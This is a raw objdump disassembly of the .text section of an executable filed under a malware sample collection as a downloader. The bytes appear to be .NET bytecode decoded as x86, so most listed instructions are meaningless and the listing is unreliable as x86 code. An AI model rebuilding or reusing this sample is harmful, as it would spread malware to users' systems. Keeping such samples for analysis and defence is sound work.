
malware_samples/downloader/7af1de15a561ea87f46d335d31319720ac61628a026c2593c30ad7028f42312e.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	44                   	inc    %esp
  402001:	4f                   	dec    %edi
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 e4 29 00    	add    %al,0x29e400
  402013:	00 6c 24 00          	add    %ch,0x0(%esp)
  402017:	00 03                	add    %al,(%ebx)
  402019:	00 02                	add    %al,(%edx)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	03 00                	add    (%eax),%eax
  402054:	8d 00                	lea    (%eax),%eax
  402056:	00 00                	add    %al,(%eax)
  402058:	01 00                	add    %eax,(%eax)
  40205a:	00 11                	add    %dl,(%ecx)
  40205c:	00 73 17             	add    %dh,0x17(%ebx)
  40205f:	00 00                	add    %al,(%eax)
  402061:	0a 0b                	or     (%ebx),%cl
  402063:	00 07                	add    %al,(%edi)
  402065:	72 01                	jb     0x402068
  402067:	00 00                	add    %al,(%eax)
  402069:	70 72                	jo     0x4020dd
  40206b:	61                   	popa
  40206c:	00 00                	add    %al,(%eax)
  40206e:	70 6f                	jo     0x4020df
  402070:	18 00                	sbb    %al,(%eax)
  402072:	00 0a                	add    %cl,(%edx)
  402074:	00 00                	add    %al,(%eax)
  402076:	de 0b                	fimuls (%ebx)
  402078:	07                   	pop    %es
  402079:	2c 07                	sub    $0x7,%al
  40207b:	07                   	pop    %es
  40207c:	6f                   	outsl  %ds:(%esi),(%dx)
  40207d:	19 00                	sbb    %eax,(%eax)
  40207f:	00 0a                	add    %cl,(%edx)
  402081:	00 dc                	add    %bl,%ah
  402083:	72 61                	jb     0x4020e6
  402085:	00 00                	add    %al,(%eax)
  402087:	70 28                	jo     0x4020b1
  402089:	1a 00                	sbb    (%eax),%al
  40208b:	00 0a                	add    %cl,(%edx)
  40208d:	26 20 f4             	es and %dh,%ah
  402090:	01 00                	add    %eax,(%eax)
  402092:	00 28                	add    %ch,(%eax)
  402094:	1b 00                	sbb    (%eax),%eax
  402096:	00 0a                	add    %cl,(%edx)
  402098:	00 72 61             	add    %dh,0x61(%edx)
  40209b:	00 00                	add    %al,(%eax)
  40209d:	70 28                	jo     0x4020c7
  40209f:	1c 00                	sbb    $0x0,%al
  4020a1:	00 0a                	add    %cl,(%edx)
  4020a3:	00 72 87             	add    %dh,-0x79(%edx)
  4020a6:	00 00                	add    %al,(%eax)
  4020a8:	70 28                	jo     0x4020d2
  4020aa:	1d 00 00 0a 00       	sbb    $0xa0000,%eax
  4020af:	72 c3                	jb     0x402074
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	70 28                	jo     0x4020dd
  4020b5:	1e                   	push   %ds
  4020b6:	00 00                	add    %al,(%eax)
  4020b8:	0a 00                	or     (%eax),%al
  4020ba:	28 1f                	sub    %bl,(%edi)
  4020bc:	00 00                	add    %al,(%eax)
  4020be:	0a 0a                	or     (%edx),%cl
  4020c0:	28 20                	sub    %ah,(%eax)
  4020c2:	00 00                	add    %al,(%eax)
  4020c4:	0a 00                	or     (%eax),%al
  4020c6:	06                   	push   %es
  4020c7:	28 05 00 00 06 00    	sub    %al,0x60000
  4020cd:	06                   	push   %es
  4020ce:	28 06                	sub    %al,(%esi)
  4020d0:	00 00                	add    %al,(%eax)
  4020d2:	06                   	push   %es
  4020d3:	00 06                	add    %al,(%esi)
  4020d5:	28 07                	sub    %al,(%edi)
  4020d7:	00 00                	add    %al,(%eax)
  4020d9:	06                   	push   %es
  4020da:	00 06                	add    %al,(%esi)
  4020dc:	28 08                	sub    %cl,(%eax)
  4020de:	00 00                	add    %al,(%eax)
  4020e0:	06                   	push   %es
  4020e1:	00 28                	add    %ch,(%eax)
  4020e3:	21 00                	and    %eax,(%eax)
  4020e5:	00 0a                	add    %cl,(%edx)
  4020e7:	26 2a 00             	sub    %es:(%eax),%al
  4020ea:	00 00                	add    %al,(%eax)
  4020ec:	01 10                	add    %edx,(%eax)
  4020ee:	00 00                	add    %al,(%eax)
  4020f0:	02 00                	add    (%eax),%al
  4020f2:	07                   	pop    %es
  4020f3:	00 15 1c 00 0b 00    	add    %dl,0xb001c
  4020f9:	00 00                	add    %al,(%eax)
  4020fb:	00 22                	add    %ah,(%edx)
  4020fd:	02 28                	add    (%eax),%ch
  4020ff:	22 00                	and    (%eax),%al
  402101:	00 0a                	add    %cl,(%edx)
  402103:	00 2a                	add    %ch,(%edx)
  402105:	00 00                	add    %al,(%eax)
  402107:	00 13                	add    %dl,(%ebx)
  402109:	30 02                	xor    %al,(%edx)
  40210b:	00 46 00             	add    %al,0x0(%esi)
  40210e:	00 00                	add    %al,(%eax)
  402110:	02 00                	add    (%eax),%al
  402112:	00 11                	add    %dl,(%ecx)
  402114:	73 0a                	jae    0x402120
  402116:	00 00                	add    %al,(%eax)
  402118:	06                   	push   %es
  402119:	0a 06                	or     (%esi),%al
  40211b:	28 23                	sub    %ah,(%ebx)
  40211d:	00 00                	add    %al,(%eax)
  40211f:	0a 7d 02             	or     0x2(%ebp),%bh
  402122:	00 00                	add    %al,(%eax)
  402124:	04 06                	add    $0x6,%al
  402126:	02 7d 03             	add    0x3(%ebp),%bh
  402129:	00 00                	add    %al,(%eax)
  40212b:	04 06                	add    $0x6,%al
  40212d:	03 7d 04             	add    0x4(%ebp),%edi
  402130:	00 00                	add    %al,(%eax)
  402132:	04 06                	add    $0x6,%al
  402134:	04 7d                	add    $0x7d,%al
  402136:	05 00 00 04 06       	add    $0x6040000,%eax
  40213b:	15 7d 01 00 00       	adc    $0x17d,%eax
  402140:	04 06                	add    $0x6,%al
  402142:	7c 02                	jl     0x402146
  402144:	00 00                	add    %al,(%eax)
  402146:	04 12                	add    $0x12,%al
  402148:	00 28                	add    %ch,(%eax)
  40214a:	01 00                	add    %eax,(%eax)
  40214c:	00 2b                	add    %ch,(%ebx)
  40214e:	06                   	push   %es
  40214f:	7c 02                	jl     0x402153
  402151:	00 00                	add    %al,(%eax)
  402153:	04 28                	add    $0x28,%al
  402155:	25 00 00 0a 2a       	and    $0x2a0a0000,%eax
  40215a:	00 00                	add    %al,(%eax)
  40215c:	13 30                	adc    (%eax),%esi
  40215e:	02 00                	add    (%eax),%al
  402160:	46                   	inc    %esi
  402161:	00 00                	add    %al,(%eax)
  402163:	00 03                	add    %al,(%ebx)
  402165:	00 00                	add    %al,(%eax)
  402167:	11 73 0d             	adc    %esi,0xd(%ebx)
  40216a:	00 00                	add    %al,(%eax)
  40216c:	06                   	push   %es
  40216d:	0a 06                	or     (%esi),%al
  40216f:	28 23                	sub    %ah,(%ebx)
  402171:	00 00                	add    %al,(%eax)
  402173:	0a 7d 0c             	or     0xc(%ebp),%bh
  402176:	00 00                	add    %al,(%eax)
  402178:	04 06                	add    $0x6,%al
  40217a:	02 7d 0d             	add    0xd(%ebp),%bh
  40217d:	00 00                	add    %al,(%eax)
  40217f:	04 06                	add    $0x6,%al
  402181:	03 7d 0e             	add    0xe(%ebp),%edi
  402184:	00 00                	add    %al,(%eax)
  402186:	04 06                	add    $0x6,%al
  402188:	04 7d                	add    $0x7d,%al
  40218a:	0f 00 00             	sldt   (%eax)
  40218d:	04 06                	add    $0x6,%al
  40218f:	15 7d 0b 00 00       	adc    $0xb7d,%eax
  402194:	04 06                	add    $0x6,%al
  402196:	7c 0c                	jl     0x4021a4
  402198:	00 00                	add    %al,(%eax)
  40219a:	04 12                	add    $0x12,%al
  40219c:	00 28                	add    %ch,(%eax)
  40219e:	02 00                	add    (%eax),%al
  4021a0:	00 2b                	add    %ch,(%ebx)
  4021a2:	06                   	push   %es
  4021a3:	7c 0c                	jl     0x4021b1
  4021a5:	00 00                	add    %al,(%eax)
  4021a7:	04 28                	add    $0x28,%al
  4021a9:	25 00 00 0a 2a       	and    $0x2a0a0000,%eax
  4021ae:	00 00                	add    %al,(%eax)
  4021b0:	1b 30                	sbb    (%eax),%esi
  4021b2:	05 00 e3 00 00       	add    $0xe300,%eax
  4021b7:	00 04 00             	add    %al,(%eax,%eax,1)
  4021ba:	00 11                	add    %dl,(%ecx)
  4021bc:	00 73 26             	add    %dh,0x26(%ebx)
  4021bf:	00 00                	add    %al,(%eax)
  4021c1:	0a 0a                	or     (%edx),%cl
  4021c3:	06                   	push   %es
  4021c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4021c5:	27                   	daa
  4021c6:	00 00                	add    %al,(%eax)
  4021c8:	0a 72 fb             	or     -0x5(%edx),%dh
  4021cb:	00 00                	add    %al,(%eax)
  4021cd:	70 02                	jo     0x4021d1
  4021cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4021d0:	28 00                	sub    %al,(%eax)
  4021d2:	00 0a                	add    %cl,(%edx)
  4021d4:	00 06                	add    %al,(%esi)
  4021d6:	72 17                	jb     0x4021ef
  4021d8:	01 00                	add    %eax,(%eax)
  4021da:	70 6f                	jo     0x40224b
  4021dc:	29 00                	sub    %eax,(%eax)
  4021de:	00 0a                	add    %cl,(%edx)
  4021e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e1:	2a 00                	sub    (%eax),%al
  4021e3:	00 0a                	add    %cl,(%edx)
  4021e5:	0b 07                	or     (%edi),%eax
  4021e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e8:	2b 00                	sub    (%eax),%eax
  4021ea:	00 0a                	add    %cl,(%edx)
  4021ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ed:	2c 00                	sub    $0x0,%al
  4021ef:	00 0a                	add    %cl,(%edx)
  4021f1:	0c 08                	or     $0x8,%al
  4021f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4021f4:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4021f9:	08 6f 2e             	or     %ch,0x2e(%edi)
  4021fc:	00 00                	add    %al,(%eax)
  4021fe:	0a 28                	or     (%eax),%ch
  402200:	03 00                	add    (%eax),%eax
  402202:	00 2b                	add    %ch,(%ebx)
  402204:	0d 00 09 6f 30       	or     $0x306f0900,%eax
  402209:	00 00                	add    %al,(%eax)
  40220b:	0a 13                	or     (%ebx),%dl
  40220d:	04 2b                	add    $0x2b,%al
  40220f:	74 12                	je     0x402223
  402211:	04 28                	add    $0x28,%al
  402213:	31 00                	xor    %eax,(%eax)
  402215:	00 0a                	add    %cl,(%edx)
  402217:	13 05 00 1b 8d 31    	adc    0x318d1b00,%eax
  40221d:	00 00                	add    %al,(%eax)
  40221f:	01 25 16 72 7d 01    	add    %esp,0x17d7216
  402225:	00 70 a2             	add    %dh,-0x5e(%eax)
  402228:	25 17 11 05 6f       	and    $0x6f051117,%eax
  40222d:	12 00                	adc    (%eax),%al
  40222f:	00 06                	add    %al,(%esi)
  402231:	a2 25 18 72 9d       	mov    %al,0x9d721825
  402236:	01 00                	add    %eax,(%eax)
  402238:	70 a2                	jo     0x4021dc
  40223a:	25 19 11 05 6f       	and    $0x6f051119,%eax
  40223f:	10 00                	adc    %al,(%eax)
  402241:	00 06                	add    %al,(%esi)
  402243:	a2 25 1a 72 a3       	mov    %al,0xa3721a25
  402248:	01 00                	add    %eax,(%eax)
  40224a:	70 a2                	jo     0x4021ee
  40224c:	28 32                	sub    %dh,(%edx)
  40224e:	00 00                	add    %al,(%eax)
  402250:	0a 28                	or     (%eax),%ch
  402252:	1e                   	push   %ds
  402253:	00 00                	add    %al,(%eax)
  402255:	0a 00                	or     (%eax),%al
  402257:	06                   	push   %es
  402258:	72 a7                	jb     0x402201
  40225a:	01 00                	add    %eax,(%eax)
  40225c:	70 11                	jo     0x40226f
  40225e:	05 6f 10 00 00       	add    $0x106f,%eax
  402263:	06                   	push   %es
  402264:	28 33                	sub    %dh,(%ebx)
  402266:	00 00                	add    %al,(%eax)
  402268:	0a 72 0f             	or     0xf(%edx),%dh
  40226b:	02 00                	add    (%eax),%al
  40226d:	70 28                	jo     0x402297
  40226f:	34 00                	xor    $0x0,%al
  402271:	00 0a                	add    %cl,(%edx)
  402273:	72 29                	jb     0x40229e
  402275:	02 00                	add    (%eax),%al
  402277:	70 73                	jo     0x4022ec
  402279:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  40227e:	36 00 00             	add    %al,%ss:(%eax)
  402281:	0a 26                	or     (%esi),%ah
  402283:	00 12                	add    %dl,(%edx)
  402285:	04 28                	add    $0x28,%al
  402287:	37                   	aaa
  402288:	00 00                	add    %al,(%eax)
  40228a:	0a 2d 83 de 0f 12    	or     0x120fde83,%ch
  402290:	04 fe                	add    $0xfe,%al
  402292:	16                   	push   %ss
  402293:	05 00 00 1b 6f       	add    $0x6f1b0000,%eax
  402298:	19 00                	sbb    %eax,(%eax)
  40229a:	00 0a                	add    %cl,(%edx)
  40229c:	00 dc                	add    %bl,%ah
  40229e:	2a 00                	sub    (%eax),%al
  4022a0:	01 10                	add    %edx,(%eax)
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	02 00                	add    (%eax),%al
  4022a6:	52                   	push   %edx
  4022a7:	00 81 d3 00 0f 00    	add    %al,0xf00d3(%ecx)
  4022ad:	00 00                	add    %al,(%eax)
  4022af:	00 1b                	add    %bl,(%ebx)
  4022b1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4022b4:	cf                   	iret
  4022b5:	00 00                	add    %al,(%eax)
  4022b7:	00 05 00 00 11 00    	add    %al,0x110000
  4022bd:	73 26                	jae    0x4022e5
  4022bf:	00 00                	add    %al,(%eax)
  4022c1:	0a 0a                	or     (%edx),%cl
  4022c3:	06                   	push   %es
  4022c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4022c5:	27                   	daa
  4022c6:	00 00                	add    %al,(%eax)
  4022c8:	0a 72 fb             	or     -0x5(%edx),%dh
  4022cb:	00 00                	add    %al,(%eax)
  4022cd:	70 02                	jo     0x4022d1
  4022cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4022d0:	28 00                	sub    %al,(%eax)
  4022d2:	00 0a                	add    %cl,(%edx)
  4022d4:	00 06                	add    %al,(%esi)
  4022d6:	72 4b                	jb     0x402323
  4022d8:	02 00                	add    (%eax),%al
  4022da:	70 6f                	jo     0x40234b
  4022dc:	29 00                	sub    %eax,(%eax)
  4022de:	00 0a                	add    %cl,(%edx)
  4022e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4022e1:	2a 00                	sub    (%eax),%al
  4022e3:	00 0a                	add    %cl,(%edx)
  4022e5:	0b 07                	or     (%edi),%eax
  4022e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4022e8:	2b 00                	sub    (%eax),%eax
  4022ea:	00 0a                	add    %cl,(%edx)
  4022ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4022ed:	2c 00                	sub    $0x0,%al
  4022ef:	00 0a                	add    %cl,(%edx)
  4022f1:	0c 08                	or     $0x8,%al
  4022f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022f4:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4022f9:	08 6f 2e             	or     %ch,0x2e(%edi)
  4022fc:	00 00                	add    %al,(%eax)
  4022fe:	0a 28                	or     (%eax),%ch
  402300:	04 00                	add    $0x0,%al
  402302:	00 2b                	add    %ch,(%ebx)
  402304:	0d 00 09 6f 38       	or     $0x386f0900,%eax
  402309:	00 00                	add    %al,(%eax)
  40230b:	0a 13                	or     (%ebx),%dl
  40230d:	04 2b                	add    $0x2b,%al
  40230f:	60                   	pusha
  402310:	12 04 28             	adc    (%eax,%ebp,1),%al
  402313:	39 00                	cmp    %eax,(%eax)
  402315:	00 0a                	add    %cl,(%edx)
  402317:	13 05 00 1b 8d 31    	adc    0x318d1b00,%eax
  40231d:	00 00                	add    %al,(%eax)
  40231f:	01 25 16 72 a7 02    	add    %esp,0x2a77216
  402325:	00 70 a2             	add    %dh,-0x5e(%eax)
  402328:	25 17 11 05 6f       	and    $0x6f051117,%eax
  40232d:	26 00 00             	add    %al,%es:(%eax)
  402330:	06                   	push   %es
  402331:	a2 25 18 72 9d       	mov    %al,0x9d721825
  402336:	01 00                	add    %eax,(%eax)
  402338:	70 a2                	jo     0x4022dc
  40233a:	25 19 11 05 6f       	and    $0x6f051119,%eax
  40233f:	24 00                	and    $0x0,%al
  402341:	00 06                	add    %al,(%esi)
  402343:	a2 25 1a 72 a3       	mov    %al,0xa3721a25
  402348:	01 00                	add    %eax,(%eax)
  40234a:	70 a2                	jo     0x4022ee
  40234c:	28 32                	sub    %dh,(%edx)
  40234e:	00 00                	add    %al,(%eax)
  402350:	0a 28                	or     (%eax),%ch
  402352:	1e                   	push   %ds
  402353:	00 00                	add    %al,(%eax)
  402355:	0a 00                	or     (%eax),%al
  402357:	06                   	push   %es
  402358:	72 c9                	jb     0x402323
  40235a:	02 00                	add    (%eax),%al
  40235c:	70 11                	jo     0x40236f
  40235e:	05 6f 24 00 00       	add    $0x246f,%eax
  402363:	06                   	push   %es
  402364:	28 33                	sub    %dh,(%ebx)
  402366:	00 00                	add    %al,(%eax)
  402368:	0a 6f 3a             	or     0x3a(%edi),%ch
  40236b:	00 00                	add    %al,(%eax)
  40236d:	0a 26                	or     (%esi),%ah
  40236f:	00 12                	add    %dl,(%edx)
  402371:	04 28                	add    $0x28,%al
  402373:	3b 00                	cmp    (%eax),%eax
  402375:	00 0a                	add    %cl,(%edx)
  402377:	2d 97 de 0f 12       	sub    $0x120fde97,%eax
  40237c:	04 fe                	add    $0xfe,%al
  40237e:	16                   	push   %ss
  40237f:	07                   	pop    %es
  402380:	00 00                	add    %al,(%eax)
  402382:	1b 6f 19             	sbb    0x19(%edi),%ebp
  402385:	00 00                	add    %al,(%eax)
  402387:	0a 00                	or     (%eax),%al
  402389:	dc 2a                	fsubrl (%edx)
  40238b:	00 01                	add    %al,(%ecx)
  40238d:	10 00                	adc    %al,(%eax)
  40238f:	00 02                	add    %al,(%edx)
  402391:	00 52 00             	add    %dl,0x0(%edx)
  402394:	6d                   	insl   (%dx),%es:(%edi)
  402395:	bf 00 0f 00 00       	mov    $0xf00,%edi
  40239a:	00 00                	add    %al,(%eax)
  40239c:	1b 30                	sbb    (%eax),%esi
  40239e:	04 00                	add    $0x0,%al
  4023a0:	da 00                	fiaddl (%eax)
  4023a2:	00 00                	add    %al,(%eax)
  4023a4:	06                   	push   %es
  4023a5:	00 00                	add    %al,(%eax)
  4023a7:	11 00                	adc    %eax,(%eax)
  4023a9:	73 26                	jae    0x4023d1
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	0a 0a                	or     (%edx),%cl
  4023af:	06                   	push   %es
  4023b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4023b1:	27                   	daa
  4023b2:	00 00                	add    %al,(%eax)
  4023b4:	0a 72 fb             	or     -0x5(%edx),%dh
  4023b7:	00 00                	add    %al,(%eax)
  4023b9:	70 02                	jo     0x4023bd
  4023bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4023bc:	28 00                	sub    %al,(%eax)
  4023be:	00 0a                	add    %cl,(%edx)
  4023c0:	00 06                	add    %al,(%esi)
  4023c2:	72 13                	jb     0x4023d7
  4023c4:	03 00                	add    (%eax),%eax
  4023c6:	70 6f                	jo     0x402437
  4023c8:	29 00                	sub    %eax,(%eax)
  4023ca:	00 0a                	add    %cl,(%edx)
  4023cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4023cd:	2a 00                	sub    (%eax),%al
  4023cf:	00 0a                	add    %cl,(%edx)
  4023d1:	0b 07                	or     (%edi),%eax
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	2b 00                	sub    (%eax),%eax
  4023d6:	00 0a                	add    %cl,(%edx)
  4023d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d9:	2c 00                	sub    $0x0,%al
  4023db:	00 0a                	add    %cl,(%edx)
  4023dd:	0c 08                	or     $0x8,%al
  4023df:	6f                   	outsl  %ds:(%esi),(%dx)
  4023e0:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4023e5:	08 6f 2e             	or     %ch,0x2e(%edi)
  4023e8:	00 00                	add    %al,(%eax)
  4023ea:	0a 28                	or     (%eax),%ch
  4023ec:	05 00 00 2b 0d       	add    $0xd2b0000,%eax
  4023f1:	00 09                	add    %cl,(%ecx)
  4023f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f4:	3c 00                	cmp    $0x0,%al
  4023f6:	00 0a                	add    %cl,(%edx)
  4023f8:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  4023fb:	6b 12 04             	imul   $0x4,(%edx),%edx
  4023fe:	28 3d 00 00 0a 13    	sub    %bh,0x130a0000
  402404:	05 00 72 6b 03       	add    $0x36b7200,%eax
  402409:	00 70 11             	add    %dh,0x11(%eax)
  40240c:	05 6f 3a 00 00       	add    $0x3a6f,%eax
  402411:	06                   	push   %es
  402412:	28 33                	sub    %dh,(%ebx)
  402414:	00 00                	add    %al,(%eax)
  402416:	0a 28                	or     (%eax),%ch
  402418:	1e                   	push   %ds
  402419:	00 00                	add    %al,(%eax)
  40241b:	0a 00                	or     (%eax),%al
  40241d:	11 05 6f 3e 00 00    	adc    %eax,0x3e6f
  402423:	06                   	push   %es
  402424:	13 06                	adc    (%esi),%eax
  402426:	11 06                	adc    %eax,(%esi)
  402428:	2c 22                	sub    $0x22,%al
  40242a:	00 06                	add    %al,(%esi)
  40242c:	72 89                	jb     0x4023b7
  40242e:	03 00                	add    (%eax),%eax
  402430:	70 11                	jo     0x402443
  402432:	05 6f 38 00 00       	add    $0x386f,%eax
  402437:	06                   	push   %es
  402438:	72 cf                	jb     0x402409
  40243a:	03 00                	add    (%eax),%eax
  40243c:	70 28                	jo     0x402466
  40243e:	3e 00 00             	add    %al,%ds:(%eax)
  402441:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402444:	3f                   	aas
  402445:	00 00                	add    %al,(%eax)
  402447:	0a 26                	or     (%esi),%ah
  402449:	00 2b                	add    %ch,(%ebx)
  40244b:	1a 00                	sbb    (%eax),%al
  40244d:	06                   	push   %es
  40244e:	72 df                	jb     0x40242f
  402450:	03 00                	add    (%eax),%eax
  402452:	70 11                	jo     0x402465
  402454:	05 6f 38 00 00       	add    $0x386f,%eax
  402459:	06                   	push   %es
  40245a:	28 33                	sub    %dh,(%ebx)
  40245c:	00 00                	add    %al,(%eax)
  40245e:	0a 6f 3a             	or     0x3a(%edi),%ch
  402461:	00 00                	add    %al,(%eax)
  402463:	0a 26                	or     (%esi),%ah
  402465:	00 00                	add    %al,(%eax)
  402467:	12 04 28             	adc    (%eax,%ebp,1),%al
  40246a:	40                   	inc    %eax
  40246b:	00 00                	add    %al,(%eax)
  40246d:	0a 2d 8c de 0f 12    	or     0x120fde8c,%ch
  402473:	04 fe                	add    $0xfe,%al
  402475:	16                   	push   %ss
  402476:	09 00                	or     %eax,(%eax)
  402478:	00 1b                	add    %bl,(%ebx)
  40247a:	6f                   	outsl  %ds:(%esi),(%dx)
  40247b:	19 00                	sbb    %eax,(%eax)
  40247d:	00 0a                	add    %cl,(%edx)
  40247f:	00 dc                	add    %bl,%ah
  402481:	2a 00                	sub    (%eax),%al
  402483:	00 01                	add    %al,(%ecx)
  402485:	10 00                	adc    %al,(%eax)
  402487:	00 02                	add    %al,(%edx)
  402489:	00 52 00             	add    %dl,0x0(%edx)
  40248c:	78 ca                	js     0x402458
  40248e:	00 0f                	add    %cl,(%edi)
  402490:	00 00                	add    %al,(%eax)
  402492:	00 00                	add    %al,(%eax)
  402494:	13 30                	adc    (%eax),%esi
  402496:	05 00 5a 00 00       	add    $0x5a00,%eax
  40249b:	00 07                	add    %al,(%edi)
  40249d:	00 00                	add    %al,(%eax)
  40249f:	11 00                	adc    %eax,(%eax)
  4024a1:	73 26                	jae    0x4024c9
  4024a3:	00 00                	add    %al,(%eax)
  4024a5:	0a 0a                	or     (%edx),%cl
  4024a7:	06                   	push   %es
  4024a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4024a9:	27                   	daa
  4024aa:	00 00                	add    %al,(%eax)
  4024ac:	0a 72 fb             	or     -0x5(%edx),%dh
  4024af:	00 00                	add    %al,(%eax)
  4024b1:	70 02                	jo     0x4024b5
  4024b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4024b4:	28 00                	sub    %al,(%eax)
  4024b6:	00 0a                	add    %cl,(%edx)
  4024b8:	00 72 39             	add    %dh,0x39(%edx)
  4024bb:	04 00                	add    $0x0,%al
  4024bd:	70 0b                	jo     0x4024ca
  4024bf:	16                   	push   %ss
  4024c0:	0c 2b                	or     $0x2b,%al
  4024c2:	2d 00 72 7d 04       	sub    $0x47d7200,%eax
  4024c7:	00 70 28             	add    %dh,0x28(%eax)
  4024ca:	1e                   	push   %ds
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	0a 00                	or     (%eax),%al
  4024cf:	06                   	push   %es
  4024d0:	07                   	pop    %es
  4024d1:	72 9b                	jb     0x40246e
  4024d3:	04 00                	add    $0x0,%al
  4024d5:	70 28                	jo     0x4024ff
  4024d7:	34 00                	xor    $0x0,%al
  4024d9:	00 0a                	add    %cl,(%edx)
  4024db:	72 29                	jb     0x402506
  4024dd:	02 00                	add    (%eax),%al
  4024df:	70 73                	jo     0x402554
  4024e1:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  4024e6:	3f                   	aas
  4024e7:	00 00                	add    %al,(%eax)
  4024e9:	0a 26                	or     (%esi),%ah
  4024eb:	00 08                	add    %cl,(%eax)
  4024ed:	17                   	pop    %ss
  4024ee:	58                   	pop    %eax
  4024ef:	0c 08                	or     $0x8,%al
  4024f1:	1f                   	pop    %ds
  4024f2:	14 fe                	adc    $0xfe,%al
  4024f4:	04 0d                	add    $0xd,%al
  4024f6:	09 2d ca 2a 22 02    	or     %ebp,0x2222aca
  4024fc:	28 22                	sub    %ah,(%edx)
  4024fe:	00 00                	add    %al,(%eax)
  402500:	0a 00                	or     (%eax),%al
  402502:	2a 22                	sub    (%edx),%ah
  402504:	02 28                	add    (%eax),%ch
  402506:	22 00                	and    (%eax),%al
  402508:	00 0a                	add    %cl,(%edx)
  40250a:	00 2a                	add    %ch,(%edx)
  40250c:	1b 30                	sbb    (%eax),%esi
  40250e:	04 00                	add    $0x0,%al
  402510:	4a                   	dec    %edx
  402511:	01 00                	add    %eax,(%eax)
  402513:	00 08                	add    %cl,(%eax)
  402515:	00 00                	add    %al,(%eax)
  402517:	11 02                	adc    %eax,(%edx)
  402519:	7b 01                	jnp    0x40251c
  40251b:	00 00                	add    %al,(%eax)
  40251d:	04 0a                	add    $0xa,%al
  40251f:	06                   	push   %es
  402520:	2c 02                	sub    $0x2,%al
  402522:	2b 02                	sub    (%edx),%eax
  402524:	2b 45 00             	sub    0x0(%ebp),%eax
  402527:	02 72 dd             	add    -0x23(%edx),%dh
  40252a:	04 00                	add    $0x0,%al
  40252c:	70 73                	jo     0x4025a1
  40252e:	41                   	inc    %ecx
  40252f:	00 00                	add    %al,(%eax)
  402531:	0a 7d 06             	or     0x6(%ebp),%bh
  402534:	00 00                	add    %al,(%eax)
  402536:	04 02                	add    $0x2,%al
  402538:	02 7b 06             	add    0x6(%ebx),%bh
  40253b:	00 00                	add    %al,(%eax)
  40253d:	04 02                	add    $0x2,%al
  40253f:	7b 04                	jnp    0x402545
  402541:	00 00                	add    %al,(%eax)
  402543:	04 73                	add    $0x73,%al
  402545:	42                   	inc    %edx
  402546:	00 00                	add    %al,(%eax)
  402548:	0a 73 43             	or     0x43(%ebx),%dh
  40254b:	00 00                	add    %al,(%eax)
  40254d:	0a 25 02 7b 05 00    	or     0x57b02,%ah
  402553:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402556:	44                   	inc    %esp
  402557:	00 00                	add    %al,(%eax)
  402559:	0a 00                	or     (%eax),%al
  40255b:	7d 07                	jge    0x402564
  40255d:	00 00                	add    %al,(%eax)
  40255f:	04 02                	add    $0x2,%al
  402561:	73 45                	jae    0x4025a8
  402563:	00 00                	add    %al,(%eax)
  402565:	0a 7d 08             	or     0x8(%ebp),%bh
  402568:	00 00                	add    %al,(%eax)
  40256a:	04 00                	add    $0x0,%al
  40256c:	06                   	push   %es
  40256d:	2c 02                	sub    $0x2,%al
  40256f:	2b 02                	sub    (%edx),%eax
  402571:	2b 48 00             	sub    0x0(%eax),%ecx
  402574:	02 7b 03             	add    0x3(%ebx),%bh
  402577:	00 00                	add    %al,(%eax)
  402579:	04 02                	add    $0x2,%al
  40257b:	7b 07                	jnp    0x402584
  40257d:	00 00                	add    %al,(%eax)
  40257f:	04 6f                	add    $0x6f,%al
  402581:	46                   	inc    %esi
  402582:	00 00                	add    %al,(%eax)
  402584:	0a 6f 47             	or     0x47(%edi),%ch
  402587:	00 00                	add    %al,(%eax)
  402589:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40258c:	02 28                	add    (%eax),%ch
  40258e:	48                   	dec    %eax
  40258f:	00 00                	add    %al,(%eax)
  402591:	0a 2d 43 02 16 25    	or     0x25160243,%ch
  402597:	0a 7d 01             	or     0x1(%ebp),%bh
  40259a:	00 00                	add    %al,(%eax)
  40259c:	04 02                	add    $0x2,%al
  40259e:	08 7d 0a             	or     %bh,0xa(%ebp)
  4025a1:	00 00                	add    %al,(%eax)
  4025a3:	04 02                	add    $0x2,%al
  4025a5:	0d 02 7c 02 00       	or     $0x27c02,%eax
  4025aa:	00 04 12             	add    %al,(%edx,%edx,1)
  4025ad:	02 12                	add    (%edx),%dl
  4025af:	03 28                	add    (%eax),%ebp
